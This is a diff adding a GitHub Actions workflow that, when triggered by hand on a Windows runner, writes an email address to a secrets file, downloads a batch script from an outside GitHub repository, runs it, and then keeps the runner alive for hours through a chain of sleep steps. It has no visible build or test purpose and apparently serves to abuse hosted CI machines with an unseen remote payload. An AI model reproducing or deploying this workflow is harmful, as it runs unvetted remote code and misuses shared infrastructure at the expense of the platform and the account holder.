@@ -1,0 +1,57 @@
+name: up
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    
+      - name: Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         start-sleep 5
+         Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/up.bat" -OutFile "up.bat"
+         cmd /c up.bat
+            
+      - name: A
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+      
+      - name: B
+        run: |
+         start-sleep 303
+         start-sleep -s 304
+
+      - name: C
+        run: |
+         start-sleep 305
+         start-sleep -s 306
+
+      - name: D
+        run: |
+         start-sleep 307
+         start-sleep -s 308
+
+      - name: E
+        run: |
+         start-sleep 309
+         start-sleep -s 310
+
+      - name: F
+        run: |
+         start-sleep 311
+         start-sleep -s 312
+      
+      - name: G
+        run: |
+         start-sleep 313
+         start-sleep -s 314
+      
+      - name: H
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
